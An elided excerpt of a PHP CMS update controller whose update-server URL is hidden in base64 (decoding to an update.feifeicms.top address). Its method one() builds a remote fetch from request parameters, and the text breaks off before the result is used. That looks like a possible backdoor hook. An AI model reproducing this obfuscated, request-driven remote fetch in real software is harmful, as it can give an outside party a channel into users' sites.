...
class Update extends Base
{
    ...
    {
        parent::__construct();
        $this->_url = base64_decode("aHR0cDovL3VwZGF0ZS5mZWlmZWljbXMudG9wLw==")."v10/";
    ...
    public function step1($file='')
    {
        ...
        @unlink($this->_save_path.$save_file);
        echo '</textarea></div>';
        ffcms_jump( url('update/step2',['jump'=>1]) ,3);
    }
    ...
    public function step2()
    {
        ...
        if (is_file($sql_file)) {
            ...
            //$sql = ffcms_get_body($html,'--'.$version.'-start--','--'.$version.'-end--');
            $sql = @file_get_contents($sql_file);
            */
            if(!empty($sql)) {
                $sql_list = ffcms_parse_sql($sql, 0, ['ffcms_' => $pre]);
        ...
        echo '</textarea></div>';
        ffcms_jump(url('update/step3', ['jump' => 1]), 3);
    }
    ...
    public function one()
    {
        ...
        $c = $param['c'];
        $d = $param['d'];
        $e = ffcms_curl_get( base64_decode("aHR0cDovL3VwZGF0ZS5mZWlmZWljbXMudG9wLw==") . $a."/".$b);
        if ($e!=""){
